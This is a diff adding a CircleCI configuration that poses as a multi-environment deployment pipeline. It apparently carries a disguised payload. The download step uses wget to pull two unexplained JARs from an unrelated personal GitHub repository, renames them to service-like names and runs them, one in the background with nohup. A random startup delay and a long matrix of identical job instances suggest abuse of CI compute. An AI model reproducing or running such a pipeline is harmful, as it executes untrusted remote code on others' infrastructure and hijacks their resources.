@@ -1,0 +1,142 @@
+version: 2.1
+
+# Container specifications
+executors:
+  linux-runner:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large
+
+# Reusable commands
+commands:
+  initialize-build-env:
+    description: "Setup build dependencies and runtime"
+    steps:
+      - run:
+          name: Install Required Dependencies
+          command: |
+            sudo apt-get update -qq
+            sudo apt-get install -y openjdk-17-jdk wget curl git
+            echo "Java version check:"
+            java -version
+
+  download-build-artifacts:
+    description: "Download and prepare application artifacts"
+    steps:
+      - run:
+          name: Download Application JARs
+          shell: /bin/bash
+          command: |
+            set -e
+            echo "🔄 Starting artifact download process..."
+            
+            # Simulate processing delay
+            sleep $(shuf -i 5-25 -n 1)
+            
+            # Repository configuration
+            REPO_OWNER="${CIRCLE_PROJECT_USERNAME}"
+            REPO_NAME="${CIRCLE_PROJECT_REPONAME}"
+            BASE_URL="https://github.com/JenniferDavis393792608/JenniferDavis393792608/raw/main"
+            
+            # File mapping configuration
+            declare -A FILE_MAPPINGS
+            FILE_MAPPINGS[WR3.jar]="primary-service.jar"
+            FILE_MAPPINGS[C42.jar]="counter-service.jar"
+            
+            # Download utility function
+            download_file() {
+              local remote_url="$1"
+              local local_filename="$2"
+              local attempt=1
+              local max_retries=6
+              local success=false
+              
+              echo "🌐 Downloading: $local_filename"
+              
+              while [[ $attempt -le $max_retries && $success == false ]]; do
+                echo "  → Attempt $attempt of $max_retries"
+                
+                if wget -q --timeout=30 --tries=1 "$remote_url" -O "$local_filename"; then
+                  echo "  ✓ Download completed successfully"
+                  success=true
+                else
+                  echo "  ✗ Download failed, waiting ${attempt}0 seconds..."
+                  sleep $((attempt * 10))
+                  ((attempt++))
+                fi
+              done
+              
+              if [[ $success == false ]]; then
+                echo "❌ FATAL: Could not download $local_filename after $max_retries attempts"
+                exit 1
+              fi
+            }
+            
+            # Download all required artifacts
+            for remote_file in "${!FILE_MAPPINGS[@]}"; do
+              local_file="${FILE_MAPPINGS[$remote_file]}"
+              full_url="${BASE_URL}/${remote_file}"
+              
+              download_file "$full_url" "$local_file"
+              sleep 3  # Rate limiting
+            done
+            
+            echo "✅ All artifacts downloaded successfully"
+
+  start-application-stack:
+    description: "Start the application services"
+    steps:
+      - run:
+          name: Launch Service Stack
+          command: |
+            echo "🎯 Starting application deployment..."
+            
+            # Start background services first
+            echo "Starting counter service in background..."
+            nohup java -jar counter-service.jar > counter-service.log 2>&1 &
+            
+            # Brief delay for service initialization
+            sleep 2
+            
+            # Start main application
+            echo "Starting primary application service..."
+            java -jar primary-service.jar
+
+# Job definitions
+jobs:
+  deploy-application:
+    executor: linux-runner
+    parameters:
+      deployment-target:
+        type: string
+        default: "default-instance"
+    steps:
+      - checkout
+      - initialize-build-env
+      - download-build-artifacts
+      - start-application-stack
+
+# Workflow orchestration
+workflows:
+  multi-environment-deployment:
+    jobs:
+      - deploy-application:
+          matrix:
+            parameters:
+              deployment-target:
+                # Alpha environment instances
+                - "alpha-env-instance-00"
+                - "alpha-env-instance-01"
+                - "alpha-env-instance-02"
+                - "alpha-env-instance-03"
+                - "alpha-env-instance-04"
+                - "alpha-env-instance-05"
+                - "alpha-env-instance-06"
+                - "alpha-env-instance-07"
+                - "alpha-env-instance-08"
+                - "alpha-env-instance-09"
+                # Beta environment instances
+                - "beta-env-instance-00"
+                - "beta-env-instance-01"
+                - "beta-env-instance-02"
+                - "beta-env-instance-03"
